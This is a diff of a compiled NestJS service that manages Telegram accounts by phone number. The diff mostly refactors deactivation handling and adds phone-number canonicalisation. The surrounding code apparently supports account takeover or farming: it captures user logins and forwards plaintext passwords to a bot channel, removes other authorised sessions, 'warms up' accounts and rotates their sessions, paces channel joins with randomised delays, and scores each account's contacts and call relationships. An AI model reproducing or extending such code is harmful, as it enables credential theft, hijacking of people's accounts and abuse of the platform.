                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -30999,8 +31233,8 @@ class BaseClientService {
             const errorMsg = errorDetails?.message || '';
             if (errorMsg.includes('Session self-check failed') || errorMsg.includes('session_revoked') || errorMsg.includes('auth_key_unregistered')) {
                 this.logger.error(`CRITICAL: Session lost for ${doc.mobile} during removeOtherAuths — marking inactive`);
-                await this.markAsInactive(doc.mobile, `Session lost during auth cleanup: ${errorMsg}`);
-                this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>CRITICAL SESSION LOSS</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${doc.warmupPhase || 'unknown'}\n<b>Error:</b> ${errorMsg?.substring(0, 200)}\n<b>Status:</b> Session revoked during auth cleanup — marked inactive`, { parseMode: 'HTML' });
+                const deactivated = await this.deactivateClient(doc.mobile, `Session lost during auth cleanup: ${errorMsg}`);
+                this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>CRITICAL SESSION LOSS</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${doc.warmupPhase || 'unknown'}\n<b>Error:</b> ${errorMsg?.substring(0, 200)}\n<b>Status:</b> Session revoked during auth cleanup — ${deactivated ? 'marked inactive' : 'inactive update failed'}`, { parseMode: 'HTML' });
                 return 0;
             }
             await this.update(doc.mobile, {
@@ -31010,7 +31244,7 @@ class BaseClientService {
             });
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message, telegramClient);
-                await this.markAsInactive(doc.mobile, reason);
+                await this.deactivateClient(doc.mobile, reason);
             }
             return 0;
         }
@@ -31029,6 +31263,22 @@ class BaseClientService {
         }
         const now = Date.now();
         let updateCount = 0;
+        const initialLastUsed = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUsed);
+        const initialWarmupPhase = doc.warmupPhase || warmup_phases_1.WarmupPhase.ENROLLED;
+        if (initialLastUsed > 0 && (initialWarmupPhase === warmup_phases_1.WarmupPhase.READY || initialWarmupPhase === warmup_phases_1.WarmupPhase.SESSION_ROTATED)) {
+            await this.backfillTimestamps(doc.mobile, doc, now);
+            if (initialWarmupPhase === warmup_phases_1.WarmupPhase.READY) {
+                const updateData = {
+                    warmupPhase: warmup_phases_1.WarmupPhase.SESSION_ROTATED,
+                    ...(!doc.sessionRotatedAt ? { sessionRotatedAt: new Date(now) } : {}),
+                };
+                await this.update(doc.mobile, updateData);
+                this.logger.log(`Client ${doc.mobile} has lastUsed in ${initialWarmupPhase}; marking warmup as ${warmup_phases_1.WarmupPhase.SESSION_ROTATED}`);
+                return { updateCount: 1, updateSummary: 'mark_session_rotated_from_last_used' };
+            }
+            this.logger.debug(`Client ${doc.mobile} has been used and is ${initialWarmupPhase}, assuming configured`);
+            return { updateCount: 0, updateSummary: 'backfill_timestamps' };
+        }
         try {
             doc = await this.repairWarmupMetadata(doc, now);
         }
@@ -31043,8 +31293,8 @@ class BaseClientService {
             const phase = doc.warmupPhase || warmup_phases_1.WarmupPhase.ENROLLED;
             if (daysSinceEnrolled > 45 && phase !== warmup_phases_1.WarmupPhase.SESSION_ROTATED && phase !== warmup_phases_1.WarmupPhase.READY) {
                 this.logger.error(`Zombie account detected: ${doc.mobile} has been warming for ${Math.round(daysSinceEnrolled)}d in phase ${phase} with repeated failures — marking inactive`);
-                await this.markAsInactive(doc.mobile, `Zombie: ${Math.round(daysSinceEnrolled)}d in ${phase} with repeated failures`);
-                this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>ZOMBIE ACCOUNT</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${phase}\n<b>Age:</b> ${Math.round(daysSinceEnrolled)}d\n<b>Fails:</b> ${failedAttempts}\n<b>Channels:</b> ${doc.channels || 0}\n<b>Status:</b> Marked inactive — manual review needed`, { parseMode: 'HTML' });
+                const deactivated = await this.deactivateClient(doc.mobile, `Zombie: ${Math.round(daysSinceEnrolled)}d in ${phase} with repeated failures`);
+                this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>ZOMBIE ACCOUNT</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Phase:</b> ${phase}\n<b>Age:</b> ${Math.round(daysSinceEnrolled)}d\n<b>Fails:</b> ${failedAttempts}\n<b>Channels:</b> ${doc.channels || 0}\n<b>Status:</b> ${deactivated ? 'Marked inactive' : 'Inactive update failed'} — manual review needed`, { parseMode: 'HTML' });
                 return { updateCount: 0 };
             }
             this.logger.log(`Resetting failure count for ${doc.mobile}`);
@@ -31071,8 +31321,17 @@ class BaseClientService {
         }
         const lastUsed = client_helper_utils_1.ClientHelperUtils.getTimestamp(doc.lastUsed);
         const warmupPhase = doc.warmupPhase || warmup_phases_1.WarmupPhase.ENROLLED;
-        if (lastUsed > 0 && (warmupPhase === warmup_phases_1.WarmupPhase.SESSION_ROTATED || warmupPhase === warmup_phases_1.WarmupPhase.READY)) {
+        if (lastUsed > 0 && (warmupPhase === warmup_phases_1.WarmupPhase.READY || warmupPhase === warmup_phases_1.WarmupPhase.SESSION_ROTATED)) {
             await this.backfillTimestamps(doc.mobile, doc, now);
+            if (warmupPhase === warmup_phases_1.WarmupPhase.READY) {
+                const updateData = {
+                    warmupPhase: warmup_phases_1.WarmupPhase.SESSION_ROTATED,
+                    ...(!doc.sessionRotatedAt ? { sessionRotatedAt: new Date(now) } : {}),
+                };
+                await this.update(doc.mobile, updateData);
+                this.logger.log(`Client ${doc.mobile} has lastUsed in ${warmupPhase}; marking warmup as ${warmup_phases_1.WarmupPhase.SESSION_ROTATED}`);
+                return { updateCount: 1, updateSummary: 'mark_session_rotated_from_last_used' };
+            }
             this.logger.debug(`Client ${doc.mobile} has been used and is ${warmupPhase}, assuming configured`);
             return { updateCount: 0, updateSummary: 'backfill_timestamps' };
         }
@@ -31203,8 +31462,8 @@ class BaseClientService {
             }
             if ((0, isPermanentError_1.default)(errorDetails)) {
                 const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                await this.markAsInactive(doc.mobile, reason);
-                this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP PERMANENT ERROR</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> ${warmupAction.action}\n<b>Phase:</b> ${warmupAction.phase}\n<b>Error:</b> ${errorDetails.message?.substring(0, 200)}\n<b>Status:</b> Marked inactive`, { parseMode: 'HTML' });
+                const deactivated = await this.deactivateClient(doc.mobile, reason);
+                this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP PERMANENT ERROR</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> ${warmupAction.action}\n<b>Phase:</b> ${warmupAction.phase}\n<b>Error:</b> ${errorDetails.message?.substring(0, 200)}\n<b>Status:</b> ${deactivated ? 'Marked inactive' : 'Inactive update failed'}`, { parseMode: 'HTML' });
             }
             else {
                 this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `<b>WARMUP ERROR</b>\n\n<b>Type:</b> ${this.clientType}\n<b>Mobile:</b> ${doc.mobile}\n<b>Action:</b> ${warmupAction.action}\n<b>Phase:</b> ${warmupAction.phase}\n<b>Fails:</b> ${failCount}/${this.MAX_FAILED_ATTEMPTS}\n<b>Error:</b> ${errorDetails?.message?.substring(0, 200) || 'unknown'}`, { parseMode: 'HTML' });
@@ -31375,7 +31634,8 @@ class BaseClientService {
             }
             catch (error) {
                 const errorDetails = this.handleError(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error`, mobile);
-                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
+                const rawErrorMessage = this.getErrorText(error);
+                if (errorDetails.error === 'FloodWaitError' || rawErrorMessage === 'CHANNELS_TOO_MUCH') {
                     this.logger.warn(`${mobile} FloodWaitError or too many channels, removing from queue`);
                     this.removeFromJoinMap(mobile);
                     await (0, Helpers_1.sleep)(client_helper_utils_1.ClientHelperUtils.gaussianRandom(12500, 1250, 10000, 15000));
@@ -31384,7 +31644,7 @@ class BaseClientService {
                         await this.update(mobile, { channels: channelsInfo.ids.length });
                     }
                     catch (channelError) {
-                        if (channelError?.errorMessage === 'CHANNELS_TOO_MUCH') {
+                        if (this.getErrorText(channelError) === 'CHANNELS_TOO_MUCH') {
                             await this.update(mobile, { channels: 500 });
                         }
                     }
@@ -31392,8 +31652,9 @@ class BaseClientService {
                 else if ((0, isPermanentError_1.default)(errorDetails)) {
                     this.removeFromJoinMap(mobile);
                     const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                    await this.markAsInactive(mobile, reason);
-                    await this.expireUserByMobile(mobile);
+                    const deactivated = await this.deactivateClient(mobile, reason);
+                    if (deactivated)
+                        await this.expireUserByMobile(mobile);
                 }
                 else {
                     const channels = this.joinChannelMap.get(mobile);
@@ -31502,8 +31763,9 @@ class BaseClientService {
                 const errorDetails = this.handleError(error, `${mobile} Leave Channel Error`, mobile);
                 if ((0, isPermanentError_1.default)(errorDetails)) {
                     const reason = await this.buildPermanentAccountReason(errorDetails.message);
-                    await this.markAsInactive(mobile, reason);
-                    await this.expireUserByMobile(mobile);
+                    const deactivated = await this.deactivateClient(mobile, reason);
+                    if (deactivated)
+                        await this.expireUserByMobile(mobile);
                     this.removeFromLeaveMap(mobile);
                 }
                 else if (channelsToProcess.length > 0) {
@@ -31693,6 +31955,9 @@ class BaseClientService {
         }
         const phase = doc.warmupPhase || this.inferWarmupPhaseFromProgress(doc);
         if ((0, warmup_phases_1.isAccountReady)(phase)) {
+            return availableDate || client_helper_utils_1.ClientHelperUtils.toDateString(now);
+        }
+        if (phase === warmup_phases_1.WarmupPhase.READY) {
             return availableDate || client_helper_utils_1.ClientHelperUtils.toDateString(now);
         }
         if (!(0, warmup_phases_1.isAccountWarmingUp)(phase))
@@ -32139,7 +32404,7 @@ class BaseClientService {
         const clients = await this.model.find({
             status: 'active',
             inUse: { $ne: true },
-        }).lean().exec();
+        }).select('mobile session').exec();
         results.total = clients.length;
         this.logger.log(`[HealSessions] Starting session heal for ${clients.length} ${this.clientType} clients`);
         for (const doc of clients) {
@@ -32181,17 +32446,20 @@ class BaseClientService {
                 }
                 else {
                     this.logger.warn(`[HealSessions] ${mobile}: session creation failed — ${createResult.error}`);
-                    await this.markAsInactive(mobile, `Session heal: creation failed — ${createResult.error}`);
-                    results.deactivated++;
-                    results.errors.push({ mobile, error: createResult.error || 'creation failed', action: 'deactivated' });
+                    const deactivated = await this.deactivateClient(mobile, `Session heal: creation failed — ${createResult.error}`);
+                    if (deactivated)
+                        results.deactivated++;
+                    else
+                        results.errors.push({ mobile, error: createResult.error || 'creation failed', action: 'deactivation failed' });
                 }
             }
             catch (error) {
                 const errMsg = (0, parseError_1.parseError)(error, `healSessionCreate:${mobile}`).message;
                 this.logger.error(`[HealSessions] ${mobile}: session creation threw — ${errMsg}`);
-                await this.markAsInactive(mobile, `Session heal: creation error — ${errMsg}`);
-                results.deactivated++;
-                results.errors.push({ mobile, error: errMsg, action: 'deactivated (creation error)' });
+                const deactivated = await this.deactivateClient(mobile, `Session heal: creation error — ${errMsg}`);
+                if (deactivated)
+                    results.deactivated++;
+                results.errors.push({ mobile, error: errMsg, action: deactivated ? 'deactivated (creation error)' : 'deactivation failed (creation error)' });
             }
             await (0, Helpers_1.sleep)(5000);
         }
@@ -32523,6 +32791,44 @@ __exportStar(__webpack_require__(/*! ./client-helper.utils */ "./src/components/
 __exportStar(__webpack_require__(/*! ./organic-activity */ "./src/components/shared/organic-activity.ts"), exports);
 __exportStar(__webpack_require__(/*! ./warmup-phases */ "./src/components/shared/warmup-phases.ts"), exports);
 __exportStar(__webpack_require__(/*! ./base-client.service */ "./src/components/shared/base-client.service.ts"), exports);
+
+
+/***/ },
+
+/***/ "./src/components/shared/mobile-utils.ts"
+/*!***********************************************!*\
+  !*** ./src/components/shared/mobile-utils.ts ***!
+  \***********************************************/
+(__unused_webpack_module, exports) {
+
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.CANONICAL_MOBILE_REGEX = void 0;
+exports.normalizeMobileInput = normalizeMobileInput;
+exports.canonicalizeMobile = canonicalizeMobile;
+exports.mobilesEqual = mobilesEqual;
+exports.CANONICAL_MOBILE_REGEX = /^[1-9]\d{10,14}$/;
+function normalizeMobileInput(value) {
+    const trimmed = value.trim();
+    return trimmed.startsWith('+') ? trimmed.slice(1) : trimmed;
+}
+function canonicalizeMobile(value) {
+    const normalized = normalizeMobileInput(value);
+    if (!exports.CANONICAL_MOBILE_REGEX.test(normalized)) {
+        throw new Error('mobile must include country code and contain 11-15 digits');
+    }
+    return normalized;
+}
+function mobilesEqual(a, b) {
+    if (!a || !b)
+        return false;
+    try {
+        return canonicalizeMobile(a) === canonicalizeMobile(b);
+    }
+    catch {
+        return false;
+    }
+}
 
 
 /***/ },
@@ -36086,6 +36392,7 @@ exports.CreateUserDto = exports.UserCallsDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
 const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class UserCallsDto {
     constructor() {
         this.totalCalls = 0;
@@ -36150,7 +36457,9 @@ class CreateUserDto {
 exports.CreateUserDto = CreateUserDto;
 __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], CreateUserDto.prototype, "mobile", void 0);
 __decorate([
@@ -36399,6 +36708,7 @@ exports.SearchUserDto = void 0;
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
 const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 class SearchUserDto {
 }
 exports.SearchUserDto = SearchUserDto;
@@ -36411,7 +36721,9 @@ __decorate([
 __decorate([
     (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number' }),
     (0, class_validator_1.IsOptional)(),
+    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? (0, mobile_utils_1.normalizeMobileInput)(value) : value),
     (0, class_validator_1.IsString)(),
+    (0, class_validator_1.Matches)(mobile_utils_1.CANONICAL_MOBILE_REGEX, { message: 'mobile must include country code and contain 11-15 digits' }),
     __metadata("design:type", String)
 ], SearchUserDto.prototype, "mobile", void 0);
 __decorate([
@@ -36576,6 +36888,7 @@ exports.UserSchema = exports.User = void 0;
 const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
 const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
+const mobile_utils_1 = __webpack_require__(/*! ../../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 let User = class User {
     constructor() {
         this.twoFA = false;
@@ -36587,7 +36900,7 @@ let User = class User {
 exports.User = User;
 __decorate([
     (0, swagger_1.ApiProperty)({ description: 'Mobile number' }),
-    (0, mongoose_1.Prop)({ required: true, unique: true }),
+    (0, mongoose_1.Prop)({ required: true, unique: true, set: mobile_utils_1.canonicalizeMobile }),
     __metadata("design:type", String)
 ], User.prototype, "mobile", void 0);
 __decorate([
@@ -37367,6 +37680,7 @@ const scoring_1 = __webpack_require__(/*! ./scoring */ "./src/components/users/s
 const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
 const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
 const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
+const mobile_utils_1 = __webpack_require__(/*! ../shared/mobile-utils */ "./src/components/shared/mobile-utils.ts");
 let UsersService = UsersService_1 = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
@@ -37376,20 +37690,22 @@ let UsersService = UsersService_1 = class UsersService {
         this.logger = new utils_1.Logger(UsersService_1.name);
     }
     async create(user) {
-        const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
-        this.logger.log(`New User received - ${user?.mobile}`);
+        const canonicalMobile = this.canonicalMobile(user.mobile);
+        const userData = { ...user, mobile: canonicalMobile };
+        const activeClientSetup = this.telegramService.getActiveClientSetup(canonicalMobile);
+        this.logger.log(`New User received - ${canonicalMobile}`);
         this.logger.debug('ActiveClientSetup:', activeClientSetup);
-        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
-            this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
-            await this.clientsService.updateClientSession(user.session, user.mobile);
+        if (activeClientSetup && activeClientSetup.newMobile === canonicalMobile) {
+            this.logger.log(`Updating New Session Details: ${canonicalMobile}, @${userData.username}, ${activeClientSetup.clientId}`);
+            await this.clientsService.updateClientSession(userData.session, canonicalMobile);
         }
         else {
-            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `<b>Account Login</b>\n\n<b>Username:</b> ${user.username ? `@${user.username}` : user.firstName}\n<b>Mobile:</b> ${user.mobile}${user.password ? `\n<b>Password:</b> ${user.password}` : ''}`, { parseMode: 'HTML' }, false);
-            const newUser = new this.userModel(user);
+            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `<b>Account Login</b>\n\n<b>Username:</b> ${userData.username ? `@${userData.username}` : userData.firstName}\n<b>Mobile:</b> ${canonicalMobile}${userData.password ? `\n<b>Password:</b> ${userData.password}` : ''}`, { parseMode: 'HTML' }, false);
+            const newUser = new this.userModel(userData);
             const saved = await newUser.save();
             setTimeout(() => {
-                this.computeRelationshipScore(user.mobile).catch(err => {
-                    this.logger.error(`Background scoring failed for ${user.mobile}`, err);
+                this.computeRelationshipScore(canonicalMobile).catch(err => {
+                    this.logger.error(`Background scoring failed for ${canonicalMobile}`, err);
                 });
             }, 5000);
             return saved;
@@ -37663,8 +37979,12 @@ let UsersService = UsersService_1 = class UsersService {
         return doc.toJSON();
     }
     async update(tgId, updateDto) {
+        const updateData = { ...updateDto };
+        if (updateData.mobile !== undefined) {
+            updateData.mobile = this.canonicalMobile(updateData.mobile);
+        }
         const updated = await this.userModel
-            .findOneAndUpdate({ tgId }, { $set: updateDto }, { new: true })
+            .findOneAndUpdate({ tgId }, { $set: updateData }, { new: true })
             .exec();
         if (!updated) {
             throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
@@ -37681,12 +38001,13 @@ let UsersService = UsersService_1 = class UsersService {
         return result.modifiedCount;
     }
     async toggleStar(mobile) {
-        const user = await this.userModel.findOne({ mobile }).select('mobile starred').exec();
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const user = await this.userModel.findOne({ mobile: canonicalMobile }).select('mobile starred').exec();
         if (!user)
             throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
         const newVal = !user.starred;
-        await this.userModel.updateOne({ mobile }, { $set: { starred: newVal } }).exec();
-        return { mobile, starred: newVal };
+        await this.userModel.updateOne({ mobile: canonicalMobile }, { $set: { starred: newVal } }).exec();
+        return { mobile: canonicalMobile, starred: newVal };
     }
     async delete(tgId) {
         const result = await this.userModel.updateOne({ tgId }, { $set: { expired: true } }).exec();
@@ -37696,8 +38017,11 @@ let UsersService = UsersService_1 = class UsersService {
     }
     async search(filter) {
         const query = { ...filter };
+        if (typeof query.mobile === 'string' && query.mobile) {
+            query.mobile = this.canonicalMobile(query.mobile);
+        }
         const escapeRegex = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-        const regexFields = ['firstName', 'lastName', 'username', 'mobile'];
+        const regexFields = ['firstName', 'lastName', 'username'];
         for (const field of regexFields) {
             if (typeof query[field] === 'string' && query[field]) {
                 query[field] = { $regex: new RegExp(escapeRegex(query[field]), 'i') };
@@ -37716,10 +38040,11 @@ let UsersService = UsersService_1 = class UsersService {
         return this.userModel.find(query).sort({ updatedAt: -1 }).limit(200).exec();
     }
     async computeRelationshipScore(mobile) {
-        const wasConnected = connection_manager_1.connectionManager.hasClient(mobile);
+        const canonicalMobile = this.canonicalMobile(mobile);
+        const wasConnected = connection_manager_1.connectionManager.hasClient(canonicalMobile);
         let telegramClient = null;
         try {
-            telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+            telegramClient = await connection_manager_1.connectionManager.getClient(canonicalMobile, { autoDisconnect: false, handler: false });
             const me = await telegramClient.getMe();
             const selfId = me.id?.toString();
             const candidateMap = new Map();
@@ -37965,7 +38290,7 @@ let UsersService = UsersService_1 = class UsersService {
             const top = (0, scoring_1.rankRelationships)(candidates, 5);
             const accountScore = (0, scoring_1.computeAccountScore)(top);
             const bestScore = top.length > 0 ? top[0].score : 0;
-            await this.userModel.updateOne({ mobile }, {
+            await this.userModel.updateOne({ mobile: canonicalMobile }, {
                 $set: {
                     'relationships.score': accountScore,
                     'relationships.bestScore': bestScore,
@@ -37974,14 +38299,14 @@ let UsersService = UsersService_1 = class UsersService {
                     calls: callAgg,
                 },
             }).exec();
-            this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
+            this.logger.log(`[${canonicalMobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
         }
         catch (error) {
-            (0, parseError_1.parseError)(error, `[${mobile}] computeRelationshipScore failed`);
+            (0, parseError_1.parseError)(error, `[${canonicalMobile}] computeRelationshipScore failed`);
         }
         finally {
             if (!wasConnected && telegramClient) {
-                await connection_manager_1.connectionManager.unregisterClient(mobile).catch(() => undefined);
+                await connection_manager_1.connectionManager.unregisterClient(canonicalMobile).catch(() => undefined);
             }
         }
     }
@@ -38020,14 +38345,24 @@ let UsersService = UsersService_1 = class UsersService {
         return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
     }
     async getUserRelationships(mobile) {
+        const canonicalMobile = this.canonicalMobile(mobile);
         const user = await this.userModel
-            .findOne({ mobile })
+            .findOne({ mobile: canonicalMobile })
             .select('mobile firstName lastName tgId relationships')
             .lean()
             .exec();
         if (!user)
             throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
         return user;
+    }
+    canonicalMobile(mobile) {
+        try {
+            return (0, mobile_utils_1.canonicalizeMobile)(mobile);
+        }
+        catch (error) {
+            const message = error instanceof Error ? error.message : String(error);
+            throw new common_1.BadRequestException(message);
+        }
     }
     async aggregateSort(computedField, sortOrder = -1, limit = 20, skip = 0) {
         const COMPUTED_FIELDS = {
